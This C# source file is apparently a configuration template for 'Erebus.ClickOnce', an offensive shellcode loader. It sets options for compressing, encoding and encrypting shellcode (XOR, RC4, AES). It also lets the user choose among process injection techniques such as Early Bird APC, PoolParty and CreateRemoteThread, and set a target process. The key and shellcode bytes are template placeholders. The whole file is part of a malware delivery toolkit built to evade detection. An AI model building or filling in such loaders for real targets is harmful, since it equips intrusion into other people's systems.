using System.Runtime.Versioning;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class InjectionConfig
    {
        // ============================================
        // COMPRESSION CONFIGURATION
        // ============================================

        /// <summary>
        /// Compression format for shellcode:
        /// - 0 = None        - No decompression
        /// - 1 = LZNT1       - LZNT1 compression
        /// - 2 = RLE         - Run-Length Encoding
        /// </summary>
        public static int CompressionType = {{ COMPRESSION_TYPE }};

        // ============================================
        // ENCODING CONFIGURATION
        // ============================================

        /// <summary>
        /// Encoding format for shellcode:
        /// - 0 = None        - No decoding
        /// - 1 = Base64      - Base64 encoding
        /// - 2 = ASCII85     - ASCII85 encoding
        /// - 3 = ALPHA32     - ALPHA32 encoding
        /// - 4 = WORDS256    - WORDS256 encoding
        /// </summary>
        public static int EncodingType = {{ ENCODING_TYPE }};

        // ============================================
        // ENCRYPTION CONFIGURATION
        // ============================================

        /// <summary>
        /// Encryption type for shellcode:
        /// - 0 = None        - No decryption
        /// - 1 = XOR         - Simple XOR cipher
        /// - 2 = RC4         - RC4 stream cipher
        /// - 3 = AES_ECB     - AES in ECB mode
        /// - 4 = AES_CBC     - AES in CBC mode
        /// </summary>
        public static int EncryptionType = {{ ENCRYPTION_TYPE }};
        
        /// <summary>
        /// Select injection method:
        /// - "createfiber"    : Fiber-based self-injection
        /// - "earlycascade"   : Early Bird APC injection (remote)
        /// - "poolparty"      : Worker Factory thread pool injection (remote)
        /// - "classic"        : Classic CreateRemoteThread injection (remote)
        /// - "enumdesktops"   : EnumDesktops callback injection (self)
        /// - "appdomain"      : AppDomain injection for .NET assemblies (self) 
        /// </summary>
        public static string InjectionMethod = "{{ INJECTION_METHOD }}";

        /// <summary>
        /// Target Process ID for remote injection methods.
        /// Set to 0 to create a new process automatically.
        /// Only applies to: earlycascade, poolparty, classic
        /// </summary>
        public static int TargetPID = 0;

        /// <summary>
        /// Target process name for remote injection (when TargetPID = 0)
        /// </summary>
        public static string TargetProcess = "{{ TARGET_PROCESS }}";

        /// <summary>
        /// Encryption key for shellcode
        /// Leave empty for no encryption (matches EncryptionType = 0)
        /// </summary>
        public static byte[] EncryptionKey = new byte[] { {{ ENCRYPTION_KEY }} };
        /// <summary>
        /// Shellcode Byte Array
        /// </summary>
        public static byte[] Shellcode = new byte[] { {{ ENCRYPTION_SHELLCODE }} };
    }
}
